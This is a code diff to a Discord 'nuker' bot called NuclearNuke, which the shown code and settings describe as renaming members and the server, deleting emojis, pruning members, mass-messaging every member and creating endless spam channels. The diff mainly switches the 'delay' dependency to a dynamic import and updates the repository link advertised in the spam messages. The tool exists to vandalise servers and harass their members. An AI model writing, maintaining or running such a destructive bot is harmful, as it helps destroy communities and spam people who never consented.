@@ -1,9 +1,8 @@
 "use strict";
 
 // Dependencies
-const discord = require("discord.js")
-const chalk = require("chalk")
-const delay = require("delay")
+const discord = require("discord.js");
+const chalk = require("chalk");
 
 // Variables
 const bot = new discord.Client()
@@ -14,10 +13,10 @@ var NuclearNuke = {
     configuration: {
         changeMembersNicknameTo: "Nuked using NuclearNuke",
         makeChannelsCalled: "Nuked using NuclearNuke",
-        sendMessageToCreatedChannel: "This server is nuked using NuclearNuke from https://github.com/i2rys/ODiscord",
+        sendMessageToCreatedChannel: "This server is nuked using NuclearNuke from https://github.com/cspi-git/ZeroDiscord/tree/main/nukers/NuclearNuke",
         changeServerNameTo: "Nuked using NuclearNuke",
         makeRolesCalled: "Nuked using NuclearNuke",
-        messageEveryMember: "One of the server your in has been nuked using NuclearNuke from https://github.com/i2rys/ODiscord",
+        messageEveryMember: "One of the server your in has been nuked using NuclearNuke from https://github.com/cspi-git/ZeroDiscord/tree/main/nukers/NuclearNuke",
         pruneDays: 1,
         makeChannelsSpamDelay: 1000,
         createdChannelsSpamMessageDelay: 2000
@@ -118,6 +117,10 @@ bot.on("message", async(message)=>{
                 NuclearNuke.log("warn", `Unable to delete server emoji called ${emoji.name}`)
             })
         })
+
+        
+        const delayModule = await import("delay");
+        const delay = delayModule.default;
 
         await delay(2000)
         NuclearNuke.log("info", "Making infinite channels in the server and messaging them.")
